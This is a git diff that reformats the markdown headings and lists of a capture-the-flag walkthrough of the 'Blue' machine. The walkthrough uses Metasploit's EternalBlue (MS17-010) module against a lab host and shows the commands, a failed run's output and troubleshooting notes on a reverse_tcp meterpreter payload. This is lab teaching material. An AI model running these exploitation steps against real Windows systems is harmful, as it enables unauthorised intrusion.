@@ -1,4 +1,5 @@
-#BLUE(Windows)
+# BLUE(Windows)
+
 First we will enumerate this machine. This is a windows machine with SMB.
 
 I used nmap to scan the vulnerablities.
@@ -46,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 107.87 seconds.
 ```
 We can see that there is Windows 7 Professional 6.1 on port 445. We can use smbclient, we run metasploit on it as well. A recent exploit on SMB is called eternal blue(ms17-010). I mean its in the name :p.
 
-##Method 1: Using Metasploit.
+## Method 1: Using Metasploit.
 
 Type this command in your terminal to open metasploit console.
 ```msfconsole```
@@ -174,7 +175,9 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.10.40
 rhosts => 10.10.10.40
 ```
 Now let it run. The above exploit can even be used on Windows 10. This exploit sometimes doesn't work on the first go. So, keep trying for more than one time.
-###Failed Attempt
+
+### Failed Attempt
+
 ```
 msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 
@@ -255,9 +258,13 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 [-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 [*] Exploit completed, but no session was created.
 ```
-Some of the reasons for above failure can be=>
--Using a Unstaged Payload.This is not the case here as we are using meterpreter reverse_tcp payload.
--lhost is not in the same network as the rhost. This is a rookie mistake. 
+Some of the reasons for above failure can be-
+
+- Using a Unstaged Payload.This is not the case here as we are using meterpreter reverse_tcp payload.
+
+- lhost is not in the same network as the rhost. This is a rookie mistake. 
+
+## Sucessful Attempt using Method 1.
 
 ```
 msf6 exploit(windows/smb/ms17_010_eternalblue) > options
